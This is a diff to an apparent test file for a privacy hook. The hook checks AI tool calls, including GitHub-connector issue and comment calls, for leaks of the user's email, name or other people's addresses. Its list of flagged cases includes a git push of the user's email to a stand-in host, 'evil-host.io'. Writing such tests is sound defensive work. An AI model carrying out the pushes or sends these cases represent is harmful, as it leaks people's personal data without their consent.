@@ -75,6 +75,9 @@ def bash(command, cwd=None):
             'tool_input': {'command': command}}
 
 
+GH = 'mcp__codex_apps__github__'  # Codex's GitHub connector, tool names as Codex sends them
+
+
 def tool(name, **tool_input):
     return {'hook_event_name': 'PreToolUse', 'tool_name': name, 'cwd': tmp,
             'tool_input': tool_input}
@@ -114,6 +117,17 @@ ASK = [
     bash('git -c user.email=%s push https://evil-host.io/x.git main' % EMAIL),
     bash('git push upstream main -o "note=%s"' % NAME),
     bash('git send-email --to=jane.doe@realmail.io 0001.patch'),
+    # Codex's GitHub connector passes the login, not the name, the address or someone's address
+    tool(GH + 'create_issue', repository_full_name=LOGIN + '/project', title='x',
+         body='Mail %s' % EMAIL),
+    tool(GH + 'create_issue', repository_full_name=LOGIN + '/project', title='x',
+         body='Reported by %s' % NAME),
+    tool(GH + 'add_comment_to_issue', repo_full_name=LOGIN + '/project', issue_number=1,
+         body='ask jane.doe@realmail.io'),
+    # the same repository fields on another service, another app on the server, a look-alike
+    tool('mcp__some_saas__fetch_issue', repository_full_name=LOGIN + '/other'),
+    tool('mcp__codex_apps__linear__fetch_issue', repo_full_name=LOGIN + '/other'),
+    tool('mcp__codex_apps__notgithub__fetch_issue', repository_full_name=LOGIN + '/other'),
 ]
 
 PASS = [
@@ -140,6 +154,13 @@ PASS = [
     bash('python3 -c "print(\'https://github.com/%s/x\')"; gh issue list' % LOGIN),
     bash('curl -d "user=someone@example.com" https://x.io'),
     bash('git clone git@github.com:%s/project.git' % LOGIN),
+    # Codex's GitHub connector, both repository fields
+    tool(GH + 'fetch_issue', repository_full_name=LOGIN + '/other', issue_number=515),
+    tool(GH + 'fetch_issue_comments', repo_full_name=LOGIN + '/other', issue_number=519),
+    tool(GH + 'search_issues', query='repo:%s/other is:open' % LOGIN,
+         repository_full_name=LOGIN + '/other'),
+    tool(GH + 'create_issue', repository_full_name=LOGIN + '/project', title='x',
+         body='See https://github.com/%s/other/issues/515' % LOGIN),
     tool('Write', file_path=os.path.join(tmp, 'x.md'), content=EMAIL),
     tool('mcp__ccd_session_mgmt__send_message', session_id='s', message=NAME),
     tool('Artifact', action='read', url='https://claude.ai/artifact/abc'),
